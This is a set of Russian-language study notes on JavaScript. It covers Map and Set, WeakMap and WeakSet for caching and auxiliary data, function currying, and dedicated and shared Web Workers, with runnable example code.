Мы только что видели, как создать `Map` из обычного объекта при помощи `Object.entries(obj)`.

Есть метод `Object.fromEntries`, который делает противоположное: получив массив пар вида `[ключ, значение]`, он создаёт из них объект:

```js run
let prices = Object.fromEntries([
  ['banana', 1],
  ['orange', 2],
  ['meat', 4]
]);

// prices = { banana: 1, orange: 2, meat: 4 }

alert(prices.orange); // 2
```

Мы можем использовать `Object.fromEntries`, чтобы получить обычный объект из `Map`.

К примеру, у нас данные в `Map`, но их нужно передать в сторонний код, который ожидает обычный объект.

Вот как это сделать:

```js run
let map = new Map();
map.set('banana', 1);
map.set('orange', 2);
map.set('meat', 4);

*!*
let obj = Object.fromEntries(map.entries()); // создаём обычный объект (*)
*/!*

// готово!
// obj = { banana: 1, orange: 2, meat: 4 }

alert(obj.orange); // 2
```

Вызов `map.entries()` возвращает итерируемый объект пар ключ/значение, как раз в нужном формате для `Object.fromEntries`.

Мы могли бы написать строку `(*)` ещё короче:

```js
let obj = Object.fromEntries(map); // убрать .entries()
```

Это то же самое, так как `Object.fromEntries` ожидает перебираемый объект в качестве аргумента, не обязательно массив. А перебор `map` как раз возвращает пары ключ/значение, так же, как и `map.entries()`. Так что в итоге у нас будет обычный объект с теми же ключами/значениями, что и в `map`.

###### Set

Объект [`Set`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set) -- это особый вид коллекции: "множество" значений (без ключей), где каждое значение может появляться только один раз.

Его основные методы это:

- [`new Set(iterable)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/Set) -- создаёт `Set`, и если в качестве аргумента был предоставлен итерируемый объект (обычно это массив), то копирует его значения в новый `Set`.
- [`set.add(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/add) -- добавляет значение (если оно уже есть, то ничего не делает), возвращает тот же объект `set`.
- [`set.delete(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/delete) -- удаляет значение, возвращает `true`, если `value` было в множестве на момент вызова, иначе `false`.
- [`set.has(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/has) -- возвращает `true`, если значение присутствует в множестве, иначе `false`.
- [`set.clear()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/clear) -- удаляет все имеющиеся значения.
- [`set.size`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/size) -- возвращает количество элементов в множестве.

Основная "изюминка" - это то, что при повторных вызовах `set.add()` с одним и тем же значением ничего не происходит, за счёт этого как раз и получается, что каждое значение появляется один раз.

Например, мы ожидаем посетителей, и нам необходимо составить их список. Но повторные визиты не должны приводить к дубликатам. Каждый посетитель должен появиться в списке только один раз.

Множество `Set` - как раз то, что нужно для этого:

```js run
let set = new Set();

let john = { name: "John" };
let pete = { name: "Pete" };
let mary = { name: "Mary" };

// считаем гостей, некоторые приходят несколько раз
set.add(john);
set.add(pete);
set.add(mary);
set.add(john);
set.add(mary);

// set хранит только 3 уникальных значения
alert(set.size); // 3

for (let user of set) {
  alert(user.name); // John (потом Pete и Mary)
}
```

Альтернативой множеству `Set` может выступать массив для хранения гостей и дополнительный код для проверки уже имеющегося элемента с помощью [arr.find](mdn:js/Array/find). Но в этом случае будет хуже производительность, потому что `arr.find` проходит весь массив для проверки наличия элемента. Множество `Set` лучше оптимизировано для добавлений, оно автоматически проверяет на уникальность.

###### Перебор объекта Set

Мы можем перебрать содержимое объекта set как с помощью метода `for..of`, так и используя `forEach`:

```js run
let set = new Set(["апельсин", "яблоко", "банан"]);

for (let value of set) alert(value);

// то же самое с forEach:
set.forEach((value, valueAgain, set) => {
  alert(value);
});
```

Заметим забавную вещь. Функция в `forEach` у `Set` имеет 3 аргумента: значение `value`, потом *снова то же самое значение* `valueAgain`, и только потом целевой объект. Это действительно так, значение появляется в списке аргументов дважды.

Это сделано для совместимости с объектом `Map`, в котором колбэк `forEach` имеет 3 аргумента. Выглядит немного странно, но в некоторых случаях может помочь легко заменить `Map` на `Set` и наоборот.

`Set` имеет те же встроенные методы, что и `Map`:

- [`set.values()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/values) -- возвращает перебираемый объект для значений,
- [`set.keys()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/keys) -- то же самое, что и `set.values()`, присутствует для обратной совместимости с `Map`,
- [`set.entries()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/entries) -- возвращает перебираемый объект для пар вида `[значение, значение]`, присутствует для обратной совместимости с `Map`.

###### Итого

[`Map`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) -- коллекция пар ключ-значение.

Методы и свойства:

- [`new Map([iterable])`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/Map) -- создаёт коллекцию, можно указать перебираемый объект (обычно массив) из пар `[ключ,значение]` для инициализации.
- [`map.set(key, value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/set) -- записывает по ключу `key` значение `value`.
- [`map.get(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/get) -- возвращает значение по ключу или `undefined`, если ключ `key` отсутствует.
- [`map.has(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/has) -- возвращает `true`, если ключ `key` присутствует в коллекции, иначе `false`.
- [`map.delete(key)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/delete) -- удаляет элемент по ключу `key`.
- [`map.clear()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/clear) -- очищает коллекцию от всех элементов.
- [`map.size`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map/size) -- возвращает текущее количество элементов.

Отличия от обычного объекта `Object`:

- Что угодно может быть ключом, в том числе и объекты.
- Есть дополнительные методы, свойство `size`.

[`Set`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set) -- коллекция уникальных значений, так называемое "множество".

Методы и свойства:

- [`new Set(iterable)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/Set) -- создаёт `Set`, можно указать перебираемый объект со значениями для инициализации.
- [`set.add(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/add) -- добавляет значение (если оно уже есть, то ничего не делает), возвращает тот же объект `set`.
- [`set.delete(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/delete) -- удаляет значение, возвращает `true` если `value` было в множестве на момент вызова, иначе `false`.
- [`set.has(value)`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/has) -- возвращает `true`, если значение присутствует в множестве, иначе `false`.
- [`set.clear()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/clear) -- удаляет все имеющиеся значения.
- [`set.size`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set/size) -- возвращает количество элементов в множестве.

Перебор `Map` и `Set` всегда осуществляется в порядке добавления элементов, так что нельзя сказать, что это -- неупорядоченные коллекции, но поменять порядок элементов или получить элемент напрямую по его номеру нельзя.


###### WeakMap и WeakSet

Как мы знаем из главы <info:garbage-collection>, движок JavaScript хранит значения в памяти до тех пор, пока они достижимы (то есть, эти значения могут быть использованы).

Например:

```js
let john = { name: "John" };

// объект доступен, переменная john — это ссылка на него

// перепишем ссылку
john = null;

*!*
// объект будет удалён из памяти
*/!*
```

Обычно свойства объекта, элементы массива или другой структуры данных считаются достижимыми и сохраняются в памяти до тех пор, пока эта структура данных содержится в памяти.

Например, если мы поместим объект в массив, то до тех пор, пока массив существует, объект также будет существовать в памяти, несмотря на то, что других ссылок на него нет.

Например:

```js
let john = { name: "John" };

let array = [ john ];

john = null; // перезаписываем ссылку на объект

*!*
// объект john хранится в массиве, поэтому он не будет удалён сборщиком мусора
// мы можем взять его значение как array[0]
*/!*
```

Аналогично, если мы используем объект как ключ в `Map`, то до тех пор, пока существует `Map`, также будет существовать и этот объект. Он занимает место в памяти и не может быть удалён сборщиком мусора.

Например:

```js
let john = { name: "John" };

let map = new Map();
map.set(john, "...");

john = null; // перезаписываем ссылку на объект

*!*
// объект john сохранён внутри объекта `Map`,
// он доступен через map.keys()
*/!*
```

`WeakMap` - принципиально другая структура в этом аспекте. Она не предотвращает удаление объектов сборщиком мусора, когда эти объекты выступают в качестве ключей.

Давайте посмотрим, что это означает, на примерах.

###### WeakMap

Первое его отличие от `Map` в том, что ключи в `WeakMap` должны быть объектами, а не примитивными значениями:

```js run
let weakMap = new WeakMap();

let obj = {};

weakMap.set(obj, "ok"); // работает (объект в качестве ключа)

*!*
// нельзя использовать строку в качестве ключа
weakMap.set("test", "Whoops"); // Ошибка, потому что "test" не объект
*/!*
```

Теперь, если мы используем объект в качестве ключа и если больше нет ссылок на этот объект, то он будет удалён из памяти (и из объекта `WeakMap`) автоматически.

```js
let john = { name: "John" };

let weakMap = new WeakMap();
weakMap.set(john, "...");

john = null; // перезаписываем ссылку на объект

// объект john удалён из памяти!
```

Сравните это поведение с поведением обычного `Map`, пример которого был приведён ранее. Теперь `john` существует только как ключ в `WeakMap` и может быть удалён оттуда автоматически.

`WeakMap` не поддерживает перебор и методы `keys()`, `values()`, `entries()`, так что нет способа взять все ключи или значения из неё.

В `WeakMap` присутствуют только следующие методы:

- `weakMap.get(key)`
- `weakMap.set(key, value)`
- `weakMap.delete(key)`
- `weakMap.has(key)`

К чему такие ограничения? Из-за особенностей технической реализации. Если объект станет недостижим (как объект `john` в примере выше), то он будет автоматически удалён сборщиком мусора. Но нет информации, *в какой момент произойдёт эта очистка*.

Решение о том, когда делать сборку мусора, принимает движок JavaScript. Он может посчитать необходимым как удалить объект прямо сейчас, так и отложить эту операцию, чтобы удалить большее количество объектов за раз позже. Так что технически количество элементов в коллекции `WeakMap` неизвестно. Движок может произвести очистку сразу или потом, или сделать это частично. По этой причине методы для доступа ко всем сразу ключам/значениям недоступны.

Но для чего же нам нужна такая структура данных?

###### Пример: дополнительные данные

В основном, `WeakMap` используется в качестве *дополнительного хранилища данных*.

Если мы работаем с объектом, который "принадлежит" другому коду, может быть даже сторонней библиотеке, и хотим сохранить у себя какие-то данные для него, которые должны существовать лишь пока существует этот объект, то `WeakMap` - как раз то, что нужно.

Мы кладём эти данные в `WeakMap`, используя объект как ключ, и когда сборщик мусора удалит объекты из памяти, ассоциированные с ними данные тоже автоматически исчезнут.

```js
weakMap.set(john, "секретные документы");
// если john умрёт, "секретные документы" будут автоматически уничтожены
```

Давайте рассмотрим один пример.

Предположим, у нас есть код, который ведёт учёт посещений для пользователей. Информация хранится в коллекции `Map`: объект, представляющий пользователя, является ключом, а количество визитов -- значением. Когда пользователь нас покидает (его объект удаляется сборщиком мусора), то больше нет смысла хранить соответствующий счётчик посещений.

Вот пример реализации счётчика посещений с использованием `Map`:

```js
// 📁 visitsCount.js
let visitsCountMap = new Map(); // map: пользователь => число визитов

// увеличиваем счётчик
function countUser(user) {
  let count = visitsCountMap.get(user) || 0;
  visitsCountMap.set(user, count + 1);
}
```

А вот другая часть кода, возможно, в другом файле, которая использует `countUser`:

```js
// 📁 main.js
let john = { name: "John" };

countUser(john); // ведём подсчёт посещений

// пользователь покинул нас
john = null;
```

Теперь объект `john` должен быть удалён сборщиком мусора, но он продолжает оставаться в памяти, так как является ключом в `visitsCountMap`.

Нам нужно очищать `visitsCountMap` при удалении объекта пользователя, иначе коллекция будет бесконечно расти. Подобная очистка может быть неудобна в реализации при сложной архитектуре приложения.

Проблемы можно избежать, если использовать `WeakMap`:

```js
// 📁 visitsCount.js
let visitsCountMap = new WeakMap(); // map: пользователь => число визитов

// увеличиваем счётчик
function countUser(user) {
  let count = visitsCountMap.get(user) || 0;
  visitsCountMap.set(user, count + 1);
}
```

Теперь нет необходимости вручную очищать `visitsCountMap`. После того, как объект  `john` стал недостижим другими способами, кроме как через `WeakMap`, он удаляется из памяти вместе с информацией по такому ключу из `WeakMap`.

###### Применение для кеширования

Другая частая сфера применения -- это кеширование, когда результат вызова функции должен где-то запоминаться ("кешироваться") для того, чтобы дальнейшие её вызовы на том же объекте могли просто брать уже готовый результат, повторно используя его.

Для хранения результатов мы можем использовать `Map`, вот так:

```js run
// 📁 cache.js
let cache = new Map();

// вычисляем и запоминаем результат
function process(obj) {
  if (!cache.has(obj)) {
    let result = /* тут какие-то вычисления результата для объекта */ obj;

    cache.set(obj, result);
  }

  return cache.get(obj);
}

*!*
// Теперь используем process() в другом файле:
*/!*

// 📁 main.js
let obj = {/* допустим, у нас есть какой-то объект */};

let result1 = process(obj); // вычислен результат

// ...позже, из другого места в коде...
let result2 = process(obj); // ранее вычисленный результат взят из кеша

// ...позже, когда объект больше не нужен:
obj = null;

alert(cache.size); // 1 (Упс! Объект всё ещё в кеше, занимает память!)
```

Многократные вызовы `process(obj)` с тем же самым объектом в качестве аргумента ведут к тому, что результат вычисляется только в первый раз, а затем последующие вызовы берут его из кеша. Недостатком является то, что необходимо вручную очищать `cache` от ставших ненужными объектов.

Но если мы будем использовать `WeakMap` вместо `Map`, то эта проблема исчезнет: закешированные результаты будут автоматически удалены из памяти сборщиком мусора.

```js run
// 📁 cache.js
*!*
let cache = new WeakMap();
*/!*

// вычисляем и запоминаем результат
function process(obj) {
  if (!cache.has(obj)) {
    let result = /* вычисляем результат для объекта */ obj;

    cache.set(obj, result);
  }

  return cache.get(obj);
}

// 📁 main.js
let obj = {/* какой-то объект */};

let result1 = process(obj);
let result2 = process(obj);

// ...позже, когда объект больше не нужен:
obj = null;

// Нет возможности получить cache.size, так как это WeakMap,
// но он равен 0 или скоро будет равен 0
// Когда сборщик мусора удаляет obj, связанные с ним данные из кеша тоже удаляются
```

###### WeakSet

Коллекция `WeakSet` ведёт себя похоже:

- Она аналогична `Set`, но мы можем добавлять в `WeakSet` только объекты (не примитивные значения).
- Объект присутствует в множестве только до тех пор, пока доступен где-то ещё.
- Как и `Set`, она поддерживает `add`, `has` и `delete`, но не `size`, `keys()` и не является перебираемой.

Будучи "слабой" версией оригинальной структуры данных, она тоже служит в качестве дополнительного хранилища. Но не для произвольных данных, а скорее для значений типа "да/нет". Присутствие во множестве `WeakSet` может что-то сказать нам об объекте.

Например, мы можем добавлять пользователей в `WeakSet` для учёта тех, кто посещал наш сайт:

```js run
let visitedSet = new WeakSet();

let john = { name: "John" };
let pete = { name: "Pete" };
let mary = { name: "Mary" };

visitedSet.add(john); // John заходил к нам
visitedSet.add(pete); // потом Pete
visitedSet.add(john); // John снова

// visitedSet сейчас содержит двух пользователей

// проверим, заходил ли John?
alert(visitedSet.has(john)); // true

// проверим, заходила ли Mary?
alert(visitedSet.has(mary)); // false

john = null;

// структура данных visitedSet будет очищена автоматически (объект john будет удалён из visitedSet)
```

Наиболее значительным ограничением `WeakMap` и `WeakSet` является то, что их нельзя перебрать или взять всё содержимое. Это может доставлять неудобства, но не мешает `WeakMap/WeakSet` выполнять их главную задачу -- быть дополнительным хранилищем данных для объектов, управляемых из каких-то других мест в коде.

###### Итого

`WeakMap` -- это `Map`-подобная коллекция, позволяющая использовать в качестве ключей только объекты, и автоматически удаляющая их вместе с соответствующими значениями, как только они становятся недостижимыми иными путями.

`WeakSet` -- это `Set`-подобная коллекция, которая хранит только объекты и удаляет их, как только они становятся недостижимыми иными путями.

Обе этих структуры данных не поддерживают методы и свойства, работающие со всем содержимым сразу или возвращающие информацию о размере коллекции. Возможны только операции на отдельном элементе коллекции.

`WeakMap` и `WeakSet` используются как вспомогательные структуры данных в дополнение к "основному" месту хранения объекта. Если объект удаляется из основного хранилища и нигде не используется, кроме как в качестве ключа в `WeakMap` или в `WeakSet`, то он будет удалён автоматически.
##### каррирование
https://learn.javascript.ru/currying-partials
https://habr.com/ru/companies/ruvds/articles/427295/
https://ru.wikipedia.org/wiki/%D0%9A%D0%B0%D1%80%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5


[Каррирование](https://ru.wikipedia.org/wiki/%D0%9A%D0%B0%D1%80%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5) - продвинутая техника для работы с функциями. Она используется не только в JavaScript, но и в других языках.

Каррирование - это трансформация функций таким образом, чтобы они принимали  аргументы не как `f(a, b, c)`, а как `f(a)(b)(c)`.

Каррирование не вызывает функцию. Оно просто трансформирует её.

Давайте сначала посмотрим на пример, чтобы лучше понять, о чём речь, а потом на практическое применение каррирования.

Создадим вспомогательную функцию `curry(f)`, которая выполняет каррирование функции `f` с двумя аргументами. Другими словами, `curry(f)` для функции `f(a, b)` трансформирует её в `f(a)(b)`.

```js run
*!*
function curry(f) { // curry(f) выполняет каррирование
  return function(a) {
    return function(b) {
      return f(a, b);
    };
  };
}
*/!*

// использование
function sum(a, b) {
  return a + b;
}

let curriedSum = curry(sum);

alert( curriedSum(1)(2) ); // 3
```

Как вы видите, реализация довольна проста: это две обёртки.

- Результат `curry(func)` -- обёртка `function(a)`.
- Когда она вызывается как `sum(1)`, аргумент сохраняется в лексическом окружении и возвращается новая обёртка `function(b)`.
- Далее уже эта обёртка вызывается с аргументом `2` и передаёт вызов к оригинальной функции `sum`.

Более продвинутые реализации каррирования, как например [_.curry](https://lodash.com/docs#curry) из библиотеки lodash, возвращают обёртку, которая позволяет запустить функцию как обычным образом, так и частично.

```js run
function sum(a, b) {
  return a + b;
}

let curriedSum = _.curry(sum); // используем _.curry из lodash

alert( curriedSum(1, 2) ); // 3, можно вызывать как обычно
alert( curriedSum(1)(2) ); // 3, а можно частично
```

###### Каррирование? Зачем?

Чтобы понять пользу от каррирования, нам определённо нужен пример из реальной жизни.

Например, у нас есть функция логирования `log(date, importance, message)`, которая форматирует и выводит информацию. В реальных проектах у таких функций есть много полезных возможностей, например, посылать логи по сети, здесь для простоты используем `alert`:

```js
function log(date, importance, message) {
  alert(`[${date.getHours()}:${date.getMinutes()}] [${importance}] ${message}`);
}
```

А теперь давайте применим к ней каррирование!

```js
log = _.curry(log);
```

После этого `log` продолжает работать нормально:

```js
log(new Date(), "DEBUG", "some debug"); // log(a, b, c)
```

...Но также работает вариант с каррированием:

```js
log(new Date())("DEBUG")("some debug"); // log(a)(b)(c)
```

Давайте сделаем удобную функцию для логов с текущим временем:

```js
// logNow будет частичным применением функции log с фиксированным первым аргументом
let logNow = log(new Date());

// используем её
logNow("INFO", "message"); // [HH:mm] INFO message
```

Теперь `logNow` - это `log` с фиксированным первым аргументом, иначе говоря, "частично применённая" или "частичная" функция.

Мы можем пойти дальше и сделать удобную функцию для именно отладочных логов с текущим временем:

```js
let debugNow = logNow("DEBUG");

debugNow("message"); // [HH:mm] DEBUG message
```

Итак:
1. Мы ничего не потеряли после каррирования: `log` всё так же можно вызывать нормально.
2. Мы можем легко создавать частично применённые функции, как сделали для логов с текущим временем.

###### Продвинутая реализация каррирования

В случае, если вам интересны детали, вот "продвинутая" реализация каррирования для функций с множеством аргументов, которую мы могли бы использовать выше.

Она очень короткая:

```js
function curry(func) {

  return function curried(...args) {
    if (args.length >= func.length) {
      return func.apply(this, args);
    } else {
      return function(...args2) {
        return curried.apply(this, args.concat(args2));
      }
    }
  };

}
```

Примеры использования:

```js
function sum(a, b, c) {
  return a + b + c;
}

let curriedSum = curry(sum);

alert( curriedSum(1, 2, 3) ); // 6, всё ещё можно вызывать нормально
alert( curriedSum(1)(2,3) ); // 6, каррирование первого аргумента
alert( curriedSum(1)(2)(3) ); // 6, каррирование всех аргументов
```

Новое `curry` выглядит сложновато, но на самом деле его легко понять.

Результат вызова `curry(func)` -- это обёртка `curried`, которая выглядит так:

```js
// func -- функция, которую мы трансформируем
function curried(...args) {
  if (args.length >= func.length) { // (1)
    return func.apply(this, args);
  } else {
    return function pass(...args2) { // (2)
      return curried.apply(this, args.concat(args2));
    }
  }
};
```

Когда мы запускаем её, есть две ветви выполнения `if`:

1. Вызвать сейчас: если количество переданных аргументов `args` совпадает с количеством аргументов при объявлении функции (`func.length`) или больше, тогда вызов просто переходит к ней.
2. Частичное применение: в противном случае `func` не вызывается сразу. Вместо этого, возвращается другая обёртка `pass`, которая снова применит `curried`, передав предыдущие аргументы вместе с новыми. Затем при новом вызове мы опять получим либо новое частичное применение (если аргументов недостаточно) либо, наконец, результат.

Например, давайте посмотрим, что произойдёт в случае `sum(a, b, c)`. У неё три аргумента, так что `sum.length = 3`.

Для вызова `curried(1)(2)(3)`:

1. Первый вызов `curried(1)` запоминает `1` в своём лексическом окружении и возвращает обёртку `pass`.
2. Обёртка `pass` вызывается с `(2)`: она берёт предыдущие аргументы (`1`), объединяет их с тем, что получила сама `(2)` и вызывает `curried(1, 2)` со всеми ними. Так как число аргументов всё ещё меньше 3-х, `curry` возвращает `pass`.
3. Обёртка `pass` вызывается снова с `(3)`. Для следующего вызова `pass(3)` берёт предыдущие аргументы (`1`, `2`) и добавляет к ним `3`, делая вызов `curried(1, 2, 3)` -- наконец 3 аргумента, и они передаются оригинальной функции.

Если всё ещё не понятно, просто распишите последовательность вызовов на бумаге.

```smart header="Только функции с фиксированным количеством аргументов"
Для каррирования необходима функция с фиксированным количеством аргументов.

Функцию, которая использует остаточные параметры, типа `f(...args)`, так каррировать не получится.
```

```smart header="Немного больше, чем каррирование"
По определению, каррирование должно превращать `sum(a, b, c)` в `sum(a)(b)(c)`.

Но, как было описано, большинство реализаций каррирования в JavaScript более продвинуты: они также оставляют вариант вызова функции с несколькими аргументами.
```

###### Итого

*Каррирование* -- это трансформация, которая превращает вызов `f(a, b, c)` в `f(a)(b)(c)`. В JavaScript реализация обычно позволяет вызывать функцию обоими вариантами: либо нормально, либо возвращает частично применённую функцию, если количество аргументов недостаточно.

Каррирование позволяет легко получать частичные функции. Как мы видели в примерах с логами: универсальная функция `log(date, importance, message)` после каррирования возвращает нам частично применённую функцию, когда вызывается с одним аргументом, как `log(date)` или двумя аргументами, как `log(date, importance)`.
##### webworkers
https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers
https://doka.guide/js/web-workers/
https://habr.com/ru/articles/767494/

**Web Workers** — предоставляют простое средство для запуска скриптов в фоновом потоке. Поток Worker'а может выполнять задачи без вмешательства в пользовательский интерфейс.  
  
Имеет доступ к _Navigator, XMLHttpRequest, Array, Date, Math, String, setTimeout(), setInterval().  
_  
Имеет следующие ограничения: отсутсвие доступа к DOM, вместо window — глобальный объект self, отсутствует доступ к cookies/localStorage/sessionStorage, также недоступны часть браузерных API, например доступ к камере/микрофону. Также у них есть ограничения по ресурсам от самого браузера.  
  
Также Web Workers имеют свой собственный event loop, но он функционирует немного по‑другому, в отличии от главного потока.

В Web Workers существует единственный поток выполнения, который используется для обработки всех задач, включая события, сообщения и выполнение кода — _WorkerGlobalScope_. Он работает в асинхронном режиме и выполняет код в ответ на сообщения и события.

Если чуть проще, то Web Workers — это скрипт, который мы можем запустить параллельно с основным потоком и выполнять какие‑то операции не блокирующие основной поток и соответсвенно не мешающие взаимодействию пользователя с нашей страницей.
> **Dedicated Worker** — worker, который создает _отдельный_ и изолированный контекст выполнения, работающий параллельно с основным потоком в приложении. В основном используется для выполнения вычислений, обработки данных и задач, которые требуют много времени, не блокирующих основной поток.

> **Shared Worker** — worker, который создает _общий_ контекст выполнения, доступный для нескольких окон, вкладок или фреймов приложения. В основном используется для выполнения кода в фоновом режиме и обеспечивает общий доступ к данным и состоянию между разными частями приложения, что делает его особенно полезным в сценариях, где несколько пользователей или компонентов должны совместно использовать данные и взаимодействовать друг с другом.


###### Как работать с Dedicated Workers ?

Все взаимодействие происходит с помощью функции `postMessage()` и listener `onmessage`, далее мы подробно их рассмотрим. Общий workflow выглядит следующим образом:

1. Инициализируем Dedicated Worker с помощью конструктора
    
2. Делаем `postMessage` из Main Thread
    
3. Срабатывает listener в Worker Thread
    
4. Worker выполняет логику, которую вы написали
    
5. Worker с помощью `postMessage` отправляет событие обратно в Main Thread
    
6. Срабатываем listener в Main Thread
    

![Схема работы Main Thread -> Worker](https://habrastorage.org/r/w1560/getpro/habr/upload_files/029/44c/197/02944c197c330e0c73c14887019f862b.png "Схема работы Main Thread -> Worker")

Схема работы Main Thread -> Worker

Мы можем создавать сколько угодно потоков(при этом, каждый из них будет иметь разный контекст), главное чтобы хватило ресурсов ПК и мы не уперлись в ограничения браузера.

> **Инициализация Dedicated Worker**

Для инициализации инстанса Worker'a, прокидываем в конструктор путь до файла нашего Worker файла

```
// new Worker('Путь до worker файла, относительно текущего файла')const worker = new Worker('worker.js');
```

Worker мы получили, далее рассмотрим основные функции для обмена данными между потоками

> `postMessage(message: any, transfer: Transferable[]): void` — метод для отправки сообщения из одного потока в другой.

- **message** — любое значение или объект, который может быть обработан [алгоритмом структурного клонирования](https://developer.mozilla.org/ru/docs/Web/API/Web_Workers_API/Structured_clone_algorithm), если коротко, то этот алгоритм продвинутее чем JSON сериализатор, например он может клонировать — Blob, File, ImageData, Buffers, может восстанавливать циклические ссылки, но не умеет в клонирование свойств и прототипов и не работает с Error, Function, DOM Elements.
    

- **transfer** — массив объектов(объекты могут быть только _ArrayBuffer_ | _MessagePort_ | _ImageBitmap_), которые перенесутся в контекст worker и больше не будут доступны в изначальном потоке, это может помочь при копировании большого объема данных, чтобы не потерять в производительности и памяти.
    

```
// Тут мы передаем buffer в контекст worker, в этом скрипте он больше не будет доступен const buffer = new ArrayBuffer(42);const data = { text: 'Hello, World!', buffer };worker.postMessage(data, [buffer]);
```

> `onmessage: ((this: Worker, event: MessageEvent) => any) | null` - слушатель отправки message.

- **event** — объект события полученный от worker/main thread
    

```
interface MessageEvent<T = any> extends Event {    // Переданные данные    readonly data: T;    // Последний идентификатор события (event ID) в случае событий, связанных с сервером    readonly lastEventId: string;    // Origin сообщения, используется, при работе с событиями связанными cross-document messaging, и позволяет определить источник отправителя сообщения.    readonly origin: string;    // Порты, по сути, открытые нами страницы, используются для обмена данными и сообщениями между веб-воркерами и основными потоками.    readonly ports: ReadonlyArray<MessagePort>;    // Предоставляет информацию об отправителе сообщения, такую как, например, какое окно отправило событие    readonly source: MessageEventSource | null;}
```

> **Пример использования**

Покажу пример использования Dedicated Worker, на примере работы с изображением(пример максимально абстрактный, без конкретных реализаций, но демонстрирует некоторые возможности).

Допустим вы пишете какое‑то подобие google docs и хотите сжимать картинку, если она больше определенного размера, и при этом не блокировать основной поток.

В основном потоке хэндлим событие выбора юзером файла изображения, отправляем его в Worker, и когда приходит обработанное изображение из Worker, добавляем эту картинку на страницу.
```js
const imageProcessingWorker = new Worker('worker.js');const imageSelect = document.getElementById('image-select');imageSelect.addEventListener('change', function(event) {  const selectedImage = event.target.files[0];  imageProcessingWorker.postMessage(selectedImage);});imageProcessingWorker.onmessage = function(event) {  const processedImage = event.data;  const imageContainer = document.getElementById('image-container');  imageContainer.appendChild(processedImage);};
```

worker.js

```js
self.onmessage = function(event) {  const image = event.data;  // Функция, которая производит какие-то преобразования с картинкой, например сжатие  const processedImage = processImage(image)    self.postMessage(processedImage);};
```

> **Убийство Dedicated Worker**

1. Когда Dedicated Worker вам больше не нужен, его можно убить с помощью `worker.terminate()`.
    
2. Dedicated Worker сам уничтожится, когда вы закроете вкладку с ним.
    

> **Use Cases**

- Обработка видео/аудио/картинок - ресайз, наложение фильтров и кодирование/декодирование медиаданных и тд.
    
- Загрузка, обработка и сохранение больших файлов.
    
- 3D-графика и различные анимации.
    
- Маппинг больших данных, например списков/различные сортировки и тд.
    

Можно самому ради интереса поискать Workers на сайтах, например, с помощью [devtools: sources → threads → smth with workers.js](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers#debugging_worker_threads)

###### Как работать с Shared Workers ?

Shared Worker работает похожим образом с Dedicated Worker, однако тут все взаимодействие проходит через `port: MessagePort,` и соответсвенно из‑за этого у нас появляется listener `onconnect` в файле Worker'a. Общий workflow выглядит следующим образом:

1. Инициализируем Shared Worker с помощью конструктора в наших файлах(в этом примере их 2)
    
2. Получаем port нашего Shared Worker'a
    
3. Делаем `port.postMessage()` из Main Threads
    
4. Устанавливаем connect с Main Threads из Worker Thread, с помощью `onconnect`
    
5. Получаем port из event'a, который прилетел нам на подключении, я пока рассматриваю случай, когда у меня 1 порт — `const port = event.ports[0];`, если у вас будет больше, выбирайте соответсвующий(порты создаются следующим образом — [тык](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel))
    
6. Worker с помощью `port.postMessage` отправляет событие обратно в Main Thread's всем портам, на которых висит `port.onmessage`
    
7. Срабатывает listeners в Main Thread's
    

![Схема работы Shared Worker с двумя страницами index1.html и index2.html](https://habrastorage.org/r/w1560/getpro/habr/upload_files/2c8/784/81a/2c878481af7176479b8bd73527a9d5bd.png "Схема работы Shared Worker с двумя страницами index1.html и index2.html")

Схема работы Shared Worker с двумя страницами index1.html и index2.html

Мы можем создавать сколько угодно потоков(при этом если мы создаем их из одного файла Worker'a, они будут иметь одинаковый контекст), главное чтобы хватило ресурсов ПК и мы не уперлись в ограничения браузера.

> **Инициализация Shared Worker**

```js
// new Worker('Путь до worker файла, относительно текущего файла')const worker = new SharedWorker('worker.js');// тут у нас в worker есть объект port он используется для управления Shared Worker
```

SharedWorker имеет такие же сигнатуры функции для `postMessage` и listener `onmessage,` а также `onconnect` имеет такую же сигантуру как `onmessage`

```js
